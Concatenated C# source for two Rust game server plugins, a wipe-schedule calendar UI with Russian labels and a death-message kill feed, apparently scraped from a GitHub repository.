        #region Config⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠
        private ConfigData config;

        private class ConfigData
        {
            [JsonProperty("Список чат-команд для открытия календаря")]
            public List<string> Commands;
            [JsonProperty("Раз во сколько секунд обновлять календарь?")]
            public int Delay;
            [JsonProperty("Цвет дней в нынешнем месяце")]
            public string ActiveColor;
            [JsonProperty("Цвет дней в предыдущем и следующем месяце")]
            public string DisactiveColor;
            [JsonProperty("Настройка")]
            public Dictionary<int, WipeClass> wipe;
        }

        private class WipeClass
        {
            [JsonProperty("Тип")]
            public Types type;
            [JsonProperty("Цвет кнопки")]
            public string color;
            [JsonProperty("Описание")]
            public string description;
        }

        private ConfigData GetDefaultConfig()
        {
            return new ConfigData
            {
                Commands = new List<string>
                {
                    "wipe", "schedule", "wipedate"
                },
                Delay = 7200,
                ActiveColor = "0.67 0.67 0.67 0.8",
                DisactiveColor = "0 0 0 0.6",
                wipe = new Dictionary<int, WipeClass>
                {
                    {
                        1, new WipeClass
                        {
                            color = "0.78 0.30 0.26 0.8",
                            type = Types.GLOBAL_WIPE,
                            description = "ГЛОБАЛЬНЫЙ ВАЙП"
                        }
                    },
                    {
                        9, new WipeClass
                        {
                            color = "0.45 0.64 0.45 0.8",
                            type = Types.WIPE,
                            description = "ВАЙП КАРТЫ"
                        }
                    },
                    {
                        16, new WipeClass
                        {
                            color = "0.78 0.30 0.26 0.8",
                            type = Types.GLOBAL_WIPE,
                            description = "ГЛОБАЛЬНЫЙ ВАЙП"
                        }
                    },
                    {
                        23, new WipeClass
                        {
                            color = "0.45 0.64 0.45 0.8",
                            type = Types.WIPE,
                            description = "ВАЙП КАРТЫ"
                        }
                    },
                    {
                        30, new WipeClass
                        {
                            color = "0.45 0.64 0.45 0.8",
                            type = Types.WIPE,
                            description = "ВАЙП КАРТЫ"
                        }
                    }
                }
            };
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();

            try
            {
                config = Config.ReadObject<ConfigData>();
                if (config == null)
                {
                    LoadDefaultConfig();
                }
            }
            catch
            {
                LoadDefaultConfig();
            }
            SaveConfig();
        }
        protected override void LoadDefaultConfig()
        {
            PrintError("Configuration file is corrupt(or not exists), creating new one!");
            config = GetDefaultConfig();
        }
        protected override void SaveConfig() => Config.WriteObject(config);
        #endregion

        #region Hooks⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠
        [PluginReference] Plugin XMenu;
        Timer TimerInitialize;
        private void OnServerInitialized()
        {

            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterMenu", this.Name, "WipeSchedule", "assets/icons/demolish_immediate.png", "RenderSchedule", null);

                    cmd.AddChatCommand("wipe", this, (p, cmd, args) => rust.RunClientCommand(p, "custommenu true WipeSchedule"));
                    TimerInitialize.Destroy();
                }
            });

            PrintWarning("  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
            PrintWarning($"     {Name} v{Version} loading");
            PrintWarning($"        Plugin loaded - OK");
            PrintWarning("  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

            for (int i = 0; i < config.Commands.Count; i++)
                cmd.AddChatCommand(config.Commands[i], this, nameof(CmdChatSchedule));

            cmd.AddConsoleCommand("UI_Schedule", this, nameof(CmdConsoleSchedule));

            CalculateTable();

            timer.Every(config.Delay, () => CalculateTable());
        }

        private void CmdChatSchedule(BasePlayer player, string command, string[] args)
        {
            
        }

        private void CmdConsoleSchedule(ConsoleSystem.Arg args)
        {
            var player = args.Player();

            int index = 0;
            if (!args.HasArgs(1) || !int.TryParse(args.Args[0], out index)) return;

            var check = DaysList[index];
            if (check.types != Types.None)
            {
                var container = new CuiElementContainer();
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = $"{check.description}", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, FontSize = 12, Font = "robotocondensed-regular.ttf" }
                }, Layer + $".Day.Of.{index}", Layer + $".Day.Of.{index}.Text");
                CuiHelper.DestroyUi(player, Layer + $".Day.Of.{index}.Text");
                CuiHelper.AddUi(player, container);
            }
        }
        #endregion

        #region Interface⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠

        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";


        private void RenderSchedule(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-430 -230",
                            OffsetMax = "490 270"
                        },
                    }
            });

            BuildUI(BasePlayer.FindByID(userID), Container);
        }

        private void BuildUI(BasePlayer player, CuiElementContainer container)
        {
            var monthName = FirstUpper(DateTime.Now.ToString("MMMM", CultureInfo.GetCultureInfo("ru-RU")));

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Color = "0 0 0 0.3" },
                Text = { Text = "" }
            }, MenuContent, Layer + ".BG");
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-450 -245", OffsetMax = "250 210" },
                Image = { Color = "0.3 0.3 0.3 0.5" },
                CursorEnabled = true
            }, Layer + ".BG", Layer);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "5 -25", OffsetMax = "200 25" },
                Text = { Text = $"<b>{monthName}</b>", FontSize = 32, Align = TextAnchor.MiddleCenter }
            }, Layer);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "5 -350", OffsetMax = "200 -25" },
                Text = { Text = $"ИНФОРМАЦИЯ О ВАПАХ TRASH RUST:\n\n<color=#73A473>Вайп без чертежей:</color> раз в 5 дней! Меняется карта и ничего не скидывается кроме статистики сервера - /stats, вайп блокировки предметов и оружия - /wipe\n\n<color=#C74D43>Глобальный вайп:</color> раз в 10 дней! Меняется карта, сбрасываются навыки вашего РПГ - /rpg, денежные бонусы - /bonus, все изученные вами чертежи вместе со статистикой в целом.\n\n*Период времени проведения вайпа по техническим причинам может меняться, но в целом отталкиваться от текущей даты, поэтому просим вас зарание ознакамливаться с информцией в группе нашего сервера <color=#FFAA00AA>vk.com/TRASHRUST</color>", FontSize = 12, Align = TextAnchor.MiddleCenter }
            }, Layer);

            #region Loop
            var xDaysSwitch = 2.5f;
            for (int i = 1; i <= 7; i++)
            {
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = $"{xDaysSwitch} 5", OffsetMax = $"{xDaysSwitch + 95} 30" },
                    Button = { Command = "", Color = "0.37 0.37 0.37 0.8" },
                    Text = { Text = DaysOfWeek[i], Align = TextAnchor.MiddleCenter, FontSize = 13, Color = "1 1 1 0.8", Font = "robotocondensed-regular.ttf" }
                }, Layer);
                xDaysSwitch += 100;
            }

            var ySwitch = -5;
            var xSwitch = 2.5f;
            for (int i = 0; i < DaysList.Count; i++)
            {
                var check = DaysList[i];

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = $"{xSwitch} {ySwitch - 70}", OffsetMax = $"{xSwitch + 95} {ySwitch}" },
                    Button = { Color = check.color, Command = $"UI_Schedule {i}", FadeIn = 1f },
                    Text = { Text = "" }
                }, Layer, Layer + $".Day.Of.{i}");
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = $"{check.day}", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, FontSize = 16 }
                }, Layer + $".Day.Of.{i}", Layer + $".Day.Of.{i}.Text");

                xSwitch += 100;

                if ((i + 1) % 7 == 0)
                {
                    xSwitch = 2.5f;
                    ySwitch -= 75;
                }
            }
            #endregion

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "712.5 5", OffsetMax = "737.5 30" },
                Image = { Color = "0.78 0.30 0.26 0.8" }
            }, Layer, Layer + ".GlobalWipe");
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 1", OffsetMin = "5 -20", OffsetMax = "175 20" },
                Text = { Text = "- Глобальный вайп с удалением чертежей", Align = TextAnchor.MiddleLeft, FontSize = 12, Font = "robotocondensed-regular.ttf" }
            }, Layer + ".GlobalWipe");
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "712.5 40", OffsetMax = "737.5 65" },
                Image = { Color = "0.45 0.64 0.45 0.8", }
            }, Layer, Layer + ".Wipe");
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 1", OffsetMin = "5 -20", OffsetMax = "175 20" },
                Text = { Text = "- Вайп без удаления чертежей", Align = TextAnchor.MiddleLeft, FontSize = 12, Font = "robotocondensed-regular.ttf" }
            }, Layer + ".Wipe");

            CuiHelper.DestroyUi(player, Layer);
            //CuiHelper.AddUi(player, container);
        }
        #endregion

        #region Utils⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠
        private void CalculateTable()
        {
            DaysList.Clear();

            Calendar myCal = CultureInfo.InvariantCulture.Calendar;
            DateTime myDT = new DateTime(DateTime.Now.Year, DateTime.Now.Month, 1, myCal);

            var PreviousMonth = myDT.AddMonths(-1);
            var DaysInPreviousMonth = (int)DateTime.DaysInMonth(PreviousMonth.Year, PreviousMonth.Month);

            int j = Convert.ToInt32(myCal.GetDayOfWeek(myDT)) - 1;

            j = j == -1 ? 6 : j;

            var LastDay = new DateTime(PreviousMonth.Year, PreviousMonth.Month, DaysInPreviousMonth);
            var backDays = LastDay.AddDays(-j + 1);
            for (int m = 0; m < j; m++)
            {
                DaysList.Add(new DayClass
                {
                    day = backDays.Day,
                    color = config.DisactiveColor,
                    description = string.Empty,
                    types = Types.None
                });
                backDays = backDays.AddDays(1);
            }

            int month = myCal.GetMonth(myDT);
            while (myCal.GetMonth(myDT) == month)
            {
                var check = config.wipe.Where(x => x.Key == myDT.Day).FirstOrDefault().Value != null;

                DaysList.Add(new DayClass
                {
                    day = myDT.Day,
                    color = check ? config.wipe[myDT.Day].color : config.ActiveColor,
                    description = check ? config.wipe[myDT.Day].description : string.Empty,
                    types = check ? config.wipe[myDT.Day].type : Types.None
                });

                myDT = myDT.AddDays(1);
                j--;
            }

            if (DaysList.Count < 42)
            {
                var DaysToEndTable = 42 - DaysList.Count;

                for (int i = 1; i <= DaysToEndTable; i++)
                {
                    DaysList.Add(new DayClass
                    {
                        day = i,
                        color = config.DisactiveColor,
                        description = string.Empty,
                        types = Types.None
                    });
                }
            }
        }

        public string FirstUpper(string str)
        {
            str = str.ToLower();
            string[] s = str.Split(' ');
            for (int i = 0; i < s.Length; i++)
            {
                if (s[i].Length > 1)
                    s[i] = s[i].Substring(0, 1).ToUpper() + s[i].Substring(1, s[i].Length - 1);
                else s[i] = s[i].ToUpper();
            }
            return string.Join(" ", s);
        }
        #endregion
    }
}

// --- End of file: WipeSchedule.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/DeathMessages.cs ---
// --- Original Local Path: HudRust/DeathMessages.cs ---

﻿using Newtonsoft.Json;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("DeathMessages", "VooDoo", "1.3.0")]
    [Description("DeathMessages")]
    public class DeathMessages : RustPlugin
    {
        #region Var's
        [PluginReference]
        private Plugin ImageLibrary, Clans;

        private bool AddImage(string url, string imageName, ulong imageId = 0, Action callback = null) => (bool)ImageLibrary.Call("AddImage", url, imageName, imageId, callback);
        private string GetImage(string imageName, ulong imageId = 0, bool returnUrl = false) => (string)ImageLibrary.Call("GetImage", imageName, imageId, returnUrl);

        private Dictionary<BaseEntity, HitInfo> lastHitInfo = new Dictionary<BaseEntity, HitInfo>();
        private Dictionary<uint, string> prefabID2Item = new Dictionary<uint, string>();
        private Dictionary<string, string> prefabName2Item = new Dictionary<string, string>()
        {
            ["40mm_grenade_he"] = "multiplegrenadelauncher",
            ["grenade.beancan.deployed"] = "grenade.beancan",
            ["grenade.f1.deployed"] = "grenade.f1",
            ["explosive.satchel.deployed"] = "explosive.satchel",
            ["explosive.timed.deployed"] = "explosive.timed",
            ["rocket_basic"] = "rocket.launcher",
            ["rocket_admin"] = "383",
            ["rocket_hv"] = "rocket.launcher",
            ["rocket_fire"] = "rocket.launcher",
            ["survey_charge.deployed"] = "surveycharge"
        };

        public static DeathMessages Instance;
        #endregion

        #region Configuration
        public PluginConfig Configuration;
        public class PluginConfig
        {
            public class ColorNickName
            {
                [JsonProperty("Цвет ника если игрока убили (hex)")]
                public string ColorDeath;
                [JsonProperty("Цвет ника если игрок убил (hex)")]
                public string ColorKill;
            }

            public class UISettings
            {
                [JsonProperty("Цвет задней панели убийства")]
                public string BackgroundColor;
                [JsonProperty("Цвет панели с дистанцией")]
                public string DistanceColor;
                [JsonProperty("Отступ сверху")]
                public int OffsetY;
            }

            [JsonProperty("Максимальное количество уведомлений")]
            public int MaxKillsForBar;
            [JsonProperty("Показывать моды оружия")]
            public bool ShowWeaponMods;
            [JsonProperty("Показывать смерть животных")]
            public bool ShowAnimalsDeath;
            [JsonProperty("Показывать хедшоты")]
            public bool ShowHeadShots;
            [JsonProperty("Цвет ника по привилегиям (По стандарту белый)")]
            public Dictionary<string, ColorNickName> ColorsNamePlayer = new Dictionary<string, ColorNickName>();
            [JsonProperty("Настройка интерфейса")]
            public UISettings UI = new UISettings();
        }

        public PluginConfig GetDefaultConfig()
        {
            return new PluginConfig
            {
                ShowWeaponMods = true,
                ShowHeadShots = true,
                ShowAnimalsDeath = true,
                MaxKillsForBar = 3,
                ColorsNamePlayer = new Dictionary<string, PluginConfig.ColorNickName>
                {
                    { "deathmessages.premium", new PluginConfig.ColorNickName { ColorDeath = "#55ff8a", ColorKill = "#55ff8a" } },
                    { "deathmessages.vip", new PluginConfig.ColorNickName { ColorDeath = "#f9ff55", ColorKill = "#f9ff55" } },
                    { "deathmessages.deluxe", new PluginConfig.ColorNickName { ColorDeath = "#7303c0", ColorKill = "#7303c0" } },
                    { "deathmessages.godlike", new PluginConfig.ColorNickName { ColorDeath = "#ff0000", ColorKill = "#ff0000" } }
                },
                UI = new PluginConfig.UISettings
                {
                    BackgroundColor = "#00000080",
                    DistanceColor = "#FFFFFF00",
                    OffsetY = 0
                }
            };
        }

        private void Init()
        {
            Configuration = Config.ReadObject<PluginConfig>();
        }

        protected override void LoadDefaultConfig()
        {
            Config.WriteObject(GetDefaultConfig(), true);
        }

        #endregion

        #region U'mod Hook's
        private void OnServerInitialized()
        {
            Instance = this;

            foreach (var itemDef in ItemManager.GetItemDefinitions())
            {
                Item newItem = ItemManager.CreateByName(itemDef.shortname, 1, 0);

                BaseEntity heldEntity = newItem.GetHeldEntity();
                if (heldEntity != null)
                {
                    prefabID2Item[heldEntity.prefabID] = itemDef.shortname;
                }

                var deployablePrefab = itemDef.GetComponent<ItemModDeployable>()?.entityPrefab?.resourcePath;
                if (string.IsNullOrEmpty(deployablePrefab))
                {
                    continue;
                }

                var shortPrefabName = GameManager.server.FindPrefab(deployablePrefab)?.GetComponent<BaseEntity>()?.ShortPrefabName;
                if (!string.IsNullOrEmpty(shortPrefabName) && !prefabName2Item.ContainsKey(shortPrefabName))
                {
                    prefabName2Item.Add(shortPrefabName, itemDef.shortname);
                }
            }

            foreach (var item in ItemManager.itemDictionary)
            {
                AddImage($"http://rust.skyplugins.ru/getimage/{item.Value.shortname}/16", item.Value.shortname, 666);
            }

            AddImage($"https://i.imgur.com/aK1fE31.png", "headshot", 1336);

            foreach (var perm in Configuration.ColorsNamePlayer)
                permission.RegisterPermission(perm.Key, this);


            if (Configuration.ShowAnimalsDeath == false)
            {
                Unsubscribe("OnEntityDeath");
            }
        }

        protected override void LoadDefaultMessages()
        {
            /*lang.RegisterMessages(new Dictionary<string, string>
            {
                ["npcplayer"] = "НПЦ",
                ["guntrap.deployed"] = "Гантрап",
                ["landmine"] = "Мина",
                ["beartrap"] = "Капкан",
                ["flameturret.deployed"] = "Огненная турель",
                ["flameturret_fireball"] = "Огненная турель",
                ["autoturret_deployed"] = "Турель",
                ["sentry.scientist.static"] = "Турель NPC",
                ["sentry.bandit.static"] = "Турель NPC",
                ["spikes.floor"] = "Шипы",
                ["spikes_static"] = "Шипы",
                ["teslacoil.deployed"] = "Тесла",
                ["barricade.wood"] = "Баррикада",
                ["barricade.woodwire"] = "Баррикада",
                ["barricade.metal"] = "Баррикада",
                ["bradleyapc"] = "Танк",
                ["gates.external.high.wood"] = "Ворота",
                ["gates.external.high.stone"] = "Ворота",
                ["icewall"] = "Ледяная стена",
                ["wall.external.high.ice"] = "Ледяная стена",
                ["wall.external.high.stone"] = "Стена",
                ["wall.external.high.wood"] = "Стена",
                ["campfire"] = "Костер",
                ["skull_fire_pit"] = "Костер",
                ["lock.code"] = "Замок",
                ["boar"] = "Кабан",
                ["bear"] = "Медведь",
                ["wolf"] = "Волк",
                ["stag"] = "Олень",
                ["chicken"] = "Курица",
                ["horse"] = "Конь",
                ["minicopter.entity"] = "Миникоптер",
                ["scraptransporthelicopter"] = "Транспортный вертолет",
                ["patrolhelicopter"] = "Патрульный вертолет",
                ["napalm"] = "Напалм",
                ["fireball_small"] = "Огонь",
                ["fireball_small_shotgun"] = "Огонь",
                ["fireball_small_arrow"] = "Огонь",
                ["sam_site_turret_deployed"] = "ПВО",
                ["cactus-1"] = "Кактус",
                ["cactus-2"] = "Кактус",
                ["cactus-3"] = "Кактус",
                ["cactus-4"] = "Кактус",
                ["cactus-5"] = "Кактус",
                ["cactus-6"] = "Кактус",
                ["cactus-7"] = "Кактус",
                ["hotairballoon"] = "Воздушный шар",
                ["cave_lift_trigger"] = "Лифт"
            }, this, "ru");*/
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["npcplayer"] = "NPC",
                ["guntrap.deployed"] = "Guntrap",
                ["landmine"] = "Landmine",
                ["beartrap"] = "Bear trap",
                ["flameturret.deployed"] = "Flame turret",
                ["flameturret_fireball"] = "Flame turret",
                ["autoturret_deployed"] = "Turret",
                ["sentry.scientist.static"] = "Turret NPC",
                ["sentry.bandit.static"] = "Turret NPC",
                ["spikes.floor"] = "Spikes",
                ["spikes_static"] = "Spikes",
                ["teslacoil.deployed"] = "Tesla",
                ["barricade.wood"] = "Barricade",
                ["barricade.woodwire"] = "Barricade",
                ["barricade.metal"] = "Barricade",
                ["bradleyapc"] = "BradleyAPC",
                ["gates.external.high.wood"] = "Gates",
                ["gates.external.high.stone"] = "Gates",
                ["icewall"] = "Ice wall",
                ["wall.external.high.ice"] = "Ice wall",
                ["wall.external.high.stone"] = "Wall",
                ["wall.external.high.wood"] = "Wall",
                ["campfire"] = "Campfire",
                ["skull_fire_pit"] = "Campfire",
                ["lock.code"] = "Codelock",
                ["boar"] = "Boar",
                ["bear"] = "Bear",
                ["wolf"] = "Wolf",
                ["stag"] = "Stag",
                ["chicken"] = "Chicken",
                ["horse"] = "Horse",
                ["minicopter.entity"] = "Minicopter",
                ["scraptransporthelicopter"] = "Transport helicopter",
                ["patrolhelicopter"] = "Patrol helicopter",
                ["napalm"] = "Napalm",
                ["fireball_small"] = "Fire",
                ["fireball_small_shotgun"] = "Fire",
                ["fireball_small_arrow"] = "Fire",
                ["sam_site_turret_deployed"] = "SAM",
                ["cactus-1"] = "Cactus",
                ["cactus-2"] = "Cactus",
                ["cactus-3"] = "Cactus",
                ["cactus-4"] = "Cactus",
                ["cactus-5"] = "Cactus",
                ["cactus-6"] = "Cactus",
                ["cactus-7"] = "Cactus",
                ["hotairballoon"] = "Hot air balloon",
                ["cave_lift_trigger"] = "Lift"
            }, this, "en");
        }

        private void Unload()
        {
            if (DeathNotesTimer != null)
                DeathNotesTimer.Destroy();

            DeathNote.DeathNotes = new List<DeathNote>();

            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, "DeathMessages");
            }
        }

        private object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitInfo)
        {
            if (entity != null && hitInfo != null)
            {
                if (entity is BasePlayer || entity is BaseAnimalNPC)
                {
                    lastHitInfo[entity] = hitInfo;
                }
            }

            return null;
        }

        private object OnEntityDeath(BaseCombatEntity entity, HitInfo hitInfo)
        {
            if (entity is BaseAnimalNPC)
            {
                if (hitInfo == null)
                {
                    if (lastHitInfo.TryGetValue(entity, out hitInfo) == false)
                    {
                        return null;
                    }
                }

                if (hitInfo.InitiatorPlayer != null)
                {
                    OnDeath(entity, hitInfo.InitiatorPlayer, hitInfo);
                }
            }
            return null;
        }

        private object OnPlayerDeath(BasePlayer player, HitInfo hitInfo)
        {
            if (player != null)
            {
                if (hitInfo == null)
                {
                    if (lastHitInfo.TryGetValue(player, out hitInfo) == false)
                    {
                        return null;
                    }
                }

                if (hitInfo.InitiatorPlayer != null)
                {
                    OnDeath(player, hitInfo.InitiatorPlayer, hitInfo);
                }
                else
                {
                    if (hitInfo.Initiator != null)
                    {
                        OnDeath(player, hitInfo.Initiator, hitInfo);
                    }
                }
            }
            return null;
        }
        #endregion

        #region Death Logic

        public struct WeaponInfo
        {
            public string WeaponName;
            public string[] WeaponMods;
            public bool IsHeadShot;
        }

        private void OnDeath(BasePlayer victim, BasePlayer initiator, HitInfo hitInfo)
        {
            string victimDisplayName = string.Empty;
            string victimColorName = string.Empty;
            string initiatorDisplayName = string.Empty;
            string initiatorColorName = string.Empty;

            bool needRenameVictim = false;
            bool needRenameInitiator = false;

            WeaponInfo weaponInfo = GetWeaponInfo(hitInfo);

            float fDistance = Vector3.Distance(victim.transform.position, initiator.transform.position);
            float sDistance = fDistance > 300 ? 300 : fDistance;

            weaponInfo.IsHeadShot = hitInfo.HitBone == 698017942;

            if (initiator.IsNpc == true || initiator.userID.IsSteamId() == false)
            {
                initiatorDisplayName = "npcplayer";
                needRenameInitiator = true;
            }
            else
            {
                /*string clanTag = string.Empty;
                if (Clans != null)
                {
                    clanTag = (string)Clans?.Call("GetClanOf", initiator);
                    if (!string.IsNullOrEmpty(clanTag))
                        clanTag = "[" + clanTag + "] ";
                }*/

                initiatorDisplayName = initiator.displayName;
            }

            if (victim.IsNpc == true || victim.userID.IsSteamId() == false)
            {
                victimDisplayName = "npcplayer";
                needRenameVictim = true;
            }
            else
            {
